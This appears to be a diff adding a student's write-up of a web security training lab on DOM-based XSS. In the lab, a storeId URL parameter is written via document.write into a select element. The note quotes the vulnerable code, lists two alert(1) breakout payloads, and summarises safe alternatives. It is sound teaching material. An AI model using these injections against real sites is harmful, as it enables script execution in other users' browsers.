@@ -1,0 +1,53 @@
+Lab 10: DOM XSS in document.write sink using source location.search inside a select element
+
+Lv -> PRACTITIONER
+
+
+1) Vuln: DXSS
+
+2) Trust Point: StoreId
+FOCUS
+- Source: location.search
+
+- Sink: document.write (dumps data from location.search straight into the HTML and writes during page load)
+
+- Goal: Break out of both the native <option> tag and parent <select> element constraints to inject an independent, self-executing executable script node
+
+
+
+3) Assumption:
+The application assumes that because the input parameter (storeId) is dropped inside a structured <select> dropdown menu component, any injected tags will be trapped as invalid or unrendered child components of the <option> element block.
+
+
+
+4) Root Cause:
+
+>>> The script dynamically pulls the 'storeId' parameter from the URL query string
+
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+
+    document.write('<select name="storeId">');
+
+if(store) {
+    
+    >>> VULNERABILITY: Raw concatenation of user input directly inside active document.write() rendering execution
+    document.write('<option selected>'+store+'</option>');
+}
+
+
+
+5) Exploit Method:
+Inject HTML termination tags into the URL parameter to prematurely collapse the existing form selection wrapper and append an executable script block.
+
+Payloads:
+</option><script>alert(1)</script>
+"></select><img src=1 onerror=alert(1)>
+    
+
+
+6) Pattern:
+-> Client-side scripts ingest parameters directly from sources (location.search, location.hash, document.referrer).
+
+-> The raw data is parsed directly into raw DOM manipulation sinks (document.write(), element.innerHTML, eval()).
+
+-> The system lacks context-aware escaping mechanisms or safe DOM-generation alternatives (like element.textContent or document.createElement()).
